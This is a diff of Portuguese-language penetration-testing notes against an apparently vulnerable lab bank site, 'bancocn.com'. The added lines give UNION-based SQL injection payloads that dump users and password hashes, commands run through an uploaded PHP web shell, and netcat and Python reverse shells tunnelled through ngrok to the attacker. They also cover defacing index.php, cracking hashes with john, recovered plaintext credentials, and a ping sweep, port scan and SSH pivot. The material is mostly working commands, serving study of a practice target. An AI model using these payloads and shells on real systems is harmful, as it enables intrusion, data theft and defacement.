@@ -73,11 +73,18 @@ Apache/2.4.29 (Ubuntu) Server at www.bancocn.com Port 80
 
 ## SQL injection
 
+* Vendo o nome do banco de dados
+www.bancocn.com/cat.php?id=-1 union select 1,2,database()
+
+* Vendo os usuários
 www.bancocn.com/cat.php?id=-1 union select 1,2,group_concat(login) from users
+
 retorna: admin
 
+* Verificando as senhas
 www.bancocn.com/cat.php?id=-1 union select 1,2,group_concat(password) from users
-retorna: 
+
+retorna:
 7b71be0e85318117d2e514ce2a2e222c
 (hash da senha - não consegue descriptografar, apenas com ataque bruto)
 
@@ -115,15 +122,72 @@ http://www.bancocn.com/admin/uploads/shell.php7?cmd=ls
 
 ## Agora vamos conectar o servidor com a nossa maquina
 
+### Usando o netcat para ouvir a porta
+
 Começamos com o comando:
 nc -lvp 789 // no servidor do atacante
-nc 127.0.0.1 789 -e /bin/bash // no servidor do atacado = executar o bash
 
 ### Usando o ngrok para fazer o tunelamento
 
 ./ngrok tcp 789
 
-tcp://0.tcp.sa.ngrok.io:15096
+url: 0.tcp.sa.ngrok.io
+porta: 14328
 
 Depois no url:
-www.bancocn.com/admin/uploads/shell.php7?cmd=nc 0.tcp.sa.ngrok.io 14745 -e /bin/bash
+www.bancocn.com/admin/uploads/shell.php7?cmd=nc [URL] [PORTA] -e /bin/bash
+www.bancocn.com/admin/uploads/shell.php7?cmd=nc 0.tcp.sa.ngrok.io 16280 -e /bin/bash
+
+### Fazendo Reverse Python
+
+www.bancocn.com/admin/uploads/shell.php7?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",14328));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+Fazer de forma interativa:
+
+python -c "import pty;pty.spawn('/bin/bash')" // usando o terminal
+
+### Modificando o site
+
+cd /var/www/html
+
+cat index.php // ve o código do site
+
+echo "Lucas Henrique" > index.php
+
+### Pegando o banco de dados
+
+cat /var/www/html/admin/uploads/bancocn.sql
+
+### Hashes
+
+utiliza o comando:
+
+john hash.txt
+
+# Credenciais
+
+Acesso do administrador:
+admin
+senhafoda
+
+/var/backups/creds.txt
+
+Encontro de mais um acesso:
+bob
+123456
+
+# Aumentando privilégios
+
+## Verificando os pins, para tentar achar alguma máquina para escalar privilégio
+
+for i in {1...254}; do (ping -c 1 10.20.20.$i&); done
+
+## Busca de portas
+
+nc -w 1 -zv 10.20.20.3 1-500
+
+## Acessando o usuário
+
+ssh bob@10.20.20.3
+
+usa a senha: 123456
